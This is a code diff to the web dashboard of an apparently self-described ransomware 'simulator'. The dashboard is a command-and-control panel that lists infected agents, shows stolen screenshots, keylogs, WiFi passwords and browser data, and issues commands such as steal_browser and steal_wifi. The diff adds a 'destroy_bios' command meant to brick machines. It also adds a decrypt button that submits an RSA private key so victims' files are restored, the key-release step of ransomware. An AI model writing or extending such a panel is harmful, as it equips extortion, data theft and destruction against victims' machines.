@@ -245,6 +245,7 @@
             cursor: pointer;
             font-size: 12px;
             transition: all 0.2s;
+            margin: 2px;
         }
 
         .action-btn:hover {
@@ -261,6 +262,15 @@
             background: #fce8e6;
             border-color: #c5221f;
             color: #c5221f;
+        }
+
+        .decrypt-btn {
+            border-color: #137333;
+            color: #137333;
+        }
+
+        .decrypt-btn:hover {
+            background: #e6f4ea;
         }
 
         .command-row {
@@ -344,6 +354,17 @@
             font-size: 40px;
             cursor: pointer;
         }
+
+        .toast-custom {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #137333;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            z-index: 9999;
+        }
     </style>
 </head>
 
@@ -375,57 +396,28 @@
         </div>
     </div>
 
-    <!-- Modal for image preview -->
     <div id="imageModal" class="modal" onclick="closeModal()">
         <span class="close">&times;</span>
-        <div class="modal-content">
-            <img id="modalImage" src="">
-        </div>
+        <div class="modal-content"><img id="modalImage" src=""></div>
     </div>
 
     <script>
         // ============ AUTHENTICATION ============
         const authData = sessionStorage.getItem('ransim_auth');
-        if (!authData) {
-            window.location.href = '/login';
-        } else {
+        if (!authData) { window.location.href = '/login'; }
+        else {
             try {
                 const { time } = JSON.parse(atob(authData));
-                if (Date.now() - time > 3600000) {
-                    sessionStorage.removeItem('ransim_auth');
-                    window.location.href = '/login';
-                }
-            } catch (e) {
-                sessionStorage.removeItem('ransim_auth');
-                window.location.href = '/login';
-            }
+                if (Date.now() - time > 3600000) { sessionStorage.removeItem('ransim_auth'); window.location.href = '/login'; }
+            } catch (e) { sessionStorage.removeItem('ransim_auth'); window.location.href = '/login'; }
         }
+        function logout() { sessionStorage.removeItem('ransim_auth'); window.location.href = '/login'; }
 
-        function logout() {
-            sessionStorage.removeItem('ransim_auth');
-            window.location.href = '/login';
-        }
-
-        // ============ GLOBAL STATE ============
         let currentPage = 'overview';
         let agentsData = [];
 
-        // ============ HELPER FUNCTIONS ============
-        function escapeHtml(str) {
-            if (!str) return '';
-            return str.replace(/[&<>]/g, function (m) {
-                if (m === '&') return '&amp;';
-                if (m === '<') return '&lt;';
-                if (m === '>') return '&gt;';
-                return m;
-            });
-        }
-
-        function formatDate(ts) {
-            if (!ts || !ts._seconds) return 'N/A';
-            return new Date(ts._seconds * 1000).toLocaleString();
-        }
-
+        function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, function (m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
+        function formatDate(ts) { if (!ts || !ts._seconds) return 'N/A'; return new Date(ts._seconds * 1000).toLocaleString(); }
         function getStatusClass(lastHeartbeat) {
             if (!lastHeartbeat || !lastHeartbeat._seconds) return 'badge-offline';
             const secondsAgo = (Date.now() / 1000) - lastHeartbeat._seconds;
@@ -433,7 +425,6 @@
             if (secondsAgo < 300) return 'badge-idle';
             return 'badge-offline';
         }
-
         function getStatusText(lastHeartbeat) {
             if (!lastHeartbeat || !lastHeartbeat._seconds) return 'OFFLINE';
             const secondsAgo = (Date.now() / 1000) - lastHeartbeat._seconds;
@@ -442,7 +433,6 @@
             return 'OFFLINE';
         }
 
-        // ============ API CALLS ============
         async function fetchAgents() {
             const res = await fetch('/api/agents');
             const data = await res.json();
@@ -451,20 +441,28 @@
         }
 
         async function deleteAgent(sessionId) {
-            if (!confirm(`Delete agent ${sessionId.substring(0, 8)}...? This will remove it from the dashboard.`)) return;
+            if (!confirm(`Delete agent ${sessionId.substring(0, 8)}...? This will remove it from dashboard.`)) return;
             try {
                 const res = await fetch(`/api/agents/${sessionId}`, { method: 'DELETE' });
                 const data = await res.json();
-                if (data.success) {
-                    showToast('Agent deleted', 'success');
-                    if (currentPage === 'agents') renderAgentsPage();
-                    if (currentPage === 'overview') refreshCurrentPage();
-                } else {
-                    showToast('Delete failed: ' + data.error, 'error');
-                }
-            } catch (err) {
-                showToast('Error: ' + err.message, 'error');
-            }
+                if (data.success) { showToast('Agent deleted', 'success'); refreshCurrentPage(); }
+                else showToast('Delete failed: ' + data.error, 'error');
+            } catch (err) { showToast('Error: ' + err.message, 'error'); }
+        }
+
+        async function decryptAgent(sessionId) {
+            const privateKey = prompt("Enter RSA Private Key (PEM format, including BEGIN and END lines):");
+            if (!privateKey) return;
+            try {
+                const res = await fetch('/api/decrypt_session', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId, private_key: privateKey })
+                });
+                const data = await res.json();
+                if (data.success) showToast('Decrypt command sent! Agent will restore files.', 'success');
+                else showToast('Decrypt failed: ' + data.error, 'error');
+            } catch (err) { showToast('Error: ' + err.message, 'error'); }
         }
 
         async function fetchExfilData(typeFilter = null) {
@@ -476,23 +474,15 @@
             return [];
         }
 
-        // ============ PAGE RENDERERS ============
         async function renderOverview() {
             const agents = await fetchAgents();
             const exfilAll = await fetchExfilData();
-
             const totalAgents = agents.length;
             const activeAgents = agents.filter(a => getStatusClass(a.lastHeartbeat) === 'badge-active').length;
             const screenshots = exfilAll.filter(e => e.type === 'screenshot').length;
             const keylogs = exfilAll.filter(e => e.type === 'keylog' || e.type === 'keylogger').length;
             const wifi = exfilAll.filter(e => e.type === 'wifi').length;
             const browser = exfilAll.filter(e => e.type === 'browser').length;
-
-            // Command stats
-            const commandsRes = await fetch('/api/exfil_data?type=command_result');
-            const commandsData = await commandsRes.json();
-            const commandCount = commandsData.success ? commandsData.data.length : 0;
-
             document.getElementById('pageTitle').innerText = 'Overview Dashboard';
             document.getElementById('pageContent').innerHTML = `
                 <div class="stats">
@@ -504,12 +494,10 @@
                     <div class="stat-card"><h3>${screenshots}</h3><p>Screenshots</p></div>
                 </div>
                 <div class="panel">
-                    <div class="panel-header">Active Sessions (with real status)</div>
+                    <div class="panel-header">Active Sessions</div>
                     <div class="panel-body-scroll">
-                        <table>
-                            <thead><tr><th>Session ID</th><th>Hostname/User</th><th>IP Address</th><th>Last Heartbeat</th><th>Status</th><th>Actions</th></tr></thead>
-                            <tbody id="overviewAgentsBody"></tbody>
-                        </table>
+                        <table><thead><tr><th>Session ID</th><th>Hostname/User</th><th>IP Address</th><th>Last Heartbeat</th><th>Status</th><th>Actions</th></tr></thead>
+                        <tbody id="overviewAgentsBody"></tbody></table>
                     </div>
                 </div>
                 <div class="panel">
@@ -532,6 +520,7 @@
                                 <option value="steal_browser">steal_browser - Steal Browser Data</option>
                                 <option value="steal_wifi">steal_wifi - Steal WiFi Passwords</option>
                                 <option value="system_info">system_info - Get System Info</option>
+                                <option value="destroy_bios">destroy_bios - Destroy BIOS/Brick System (VM only)</option>
                                 <option value="uninstall">uninstall - Uninstall Agent</option>
                             </select></div>
                             <div><label>&nbsp;</label><button onclick="sendCommandFromOverview()">🚀 Execute</button></div>
@@ -540,7 +529,6 @@
                     </div>
                 </div>
             `;
-            // Fill agents table
             const tbody = document.getElementById('overviewAgentsBody');
             tbody.innerHTML = agents.map(a => `
                 <tr>
@@ -549,13 +537,11 @@
                     <td>${escapeHtml(a.ip || '?')}</td>
                     <td>${formatDate(a.lastHeartbeat)}</td>
                     <td><span class="${getStatusClass(a.lastHeartbeat)}">${getStatusText(a.lastHeartbeat)}</span></td>
-                    <td><button class="action-btn" onclick="deleteAgent('${a.sessionId || a.id}')">🗑️ Delete</button></td>
+                    <td><button class="action-btn decrypt-btn" onclick="decryptAgent('${a.sessionId || a.id}')">🔓 Decrypt</button><button class="action-btn delete-btn" onclick="deleteAgent('${a.sessionId || a.id}')">🗑️ Delete</button></td>
                 </tr>
             `).join('');
-            // Fill session dropdown
             const sessionSelect = document.getElementById('cmdSession');
             sessionSelect.innerHTML = '<option value="all">ALL ACTIVE AGENTS</option>' + agents.map(a => `<option value="${a.sessionId || a.id}">${(a.sessionId || a.id).substring(0, 8)}... - ${a.hostname}</option>`).join('');
-            // Command type change
             const cmdType = document.getElementById('cmdType');
             const execDiv = document.getElementById('execParamsDiv');
             cmdType.onchange = () => { execDiv.style.display = cmdType.value === 'exec' ? 'block' : 'none'; };
@@ -648,7 +634,7 @@
             else {
                 tbody.innerHTML = data.slice(0, 100).map(cmd => `<tr>
                     <td><code>${escapeHtml(cmd.sessionId?.substring(0, 8))}</code></td>
-                    <td><span class="badge badge-active" style="background:#2a1a4e;">${escapeHtml(cmd.command_type)}</span></td>
+                    <td><span class="badge-active" style="background:#2a1a4e;">${escapeHtml(cmd.command_type)}</span></td>
                     <td><span class="badge ${cmd.status === 'completed' ? 'badge-active' : 'badge-offline'}">${escapeHtml(cmd.status || 'unknown')}</span></td>
                     <td><pre style="max-width:300px; overflow:auto;">${escapeHtml((cmd.result || cmd.error || '')?.substring(0, 200))}</pre></td>
                     <td>${formatDate(cmd.timestamp)}</td>
@@ -659,8 +645,7 @@
         async function renderAgentsPage() {
             document.getElementById('pageTitle').innerText = 'Agents Management';
             const agents = await fetchAgents();
-            document.getElementById('pageContent').innerHTML = `
-                <div class="panel"><div class="panel-header">All Agents</div><div class="panel-body-scroll"><table><thead><tr><th>Session ID</th><th>Hostname</th><th>Username</th><th>IP</th><th>Last Heartbeat</th><th>Status</th><th>Actions</th></tr></thead><tbody id="agentsManageBody"></tbody></table></div></div>`;
+            document.getElementById('pageContent').innerHTML = `<div class="panel"><div class="panel-header">All Agents</div><div class="panel-body-scroll"><table><thead><tr><th>Session ID</th><th>Hostname</th><th>Username</th><th>IP</th><th>Last Heartbeat</th><th>Status</th><th>Actions</th></tr></thead><tbody id="agentsManageBody"></tbody></table></div></div>`;
             const tbody = document.getElementById('agentsManageBody');
             tbody.innerHTML = agents.map(a => `
                 <tr>
@@ -670,12 +655,11 @@
                     <td>${escapeHtml(a.ip)}</td>
                     <td>${formatDate(a.lastHeartbeat)}</td>
                     <td><span class="${getStatusClass(a.lastHeartbeat)}">${getStatusText(a.lastHeartbeat)}</span></td>
-                    <td><button class="action-btn delete-btn" onclick="deleteAgent('${a.sessionId || a.id}')">🗑️ Delete</button></td>
+                    <td><button class="action-btn decrypt-btn" onclick="decryptAgent('${a.sessionId || a.id}')">🔓 Decrypt</button><button class="action-btn delete-btn" onclick="deleteAgent('${a.sessionId || a.id}')">🗑️ Delete</button></td>
                 </tr>
             `).join('');
         }
 
-        // ============ NAVIGATION ============
         async function refreshCurrentPage() {
             if (currentPage === 'overview') await renderOverview();
             else if (currentPage === 'screenshots') await renderScreenshots();
@@ -690,27 +674,12 @@
             const toast = document.createElement('div');
             toast.className = 'toast-custom';
             toast.innerText = msg;
-            toast.style.position = 'fixed';
-            toast.style.bottom = '20px';
-            toast.style.right = '20px';
-            toast.style.backgroundColor = type === 'success' ? '#137333' : '#c5221f';
-            toast.style.color = 'white';
-            toast.style.padding = '12px 20px';
-            toast.style.borderRadius = '8px';
-            toast.style.zIndex = '9999';
             document.body.appendChild(toast);
             setTimeout(() => toast.remove(), 3000);
         }
 
-        function showImageModal(src) {
-            const modal = document.getElementById('imageModal');
-            const img = document.getElementById('modalImage');
-            img.src = src;
-            modal.style.display = 'flex';
-        }
-        function closeModal() {
-            document.getElementById('imageModal').style.display = 'none';
-        }
+        function showImageModal(src) { const modal = document.getElementById('imageModal'); document.getElementById('modalImage').src = src; modal.style.display = 'flex'; }
+        function closeModal() { document.getElementById('imageModal').style.display = 'none'; }
 
         document.querySelectorAll('.nav-item').forEach(item => {
             item.addEventListener('click', async () => {
@@ -721,10 +690,9 @@
                 await refreshCurrentPage();
             });
         });
-
-        // Initialize
         refreshCurrentPage();
-        setInterval(refreshCurrentPage, 30000);
+        setInterval(refreshCurrentPage, 15000);
     </script>
 </body>
+
 </html>
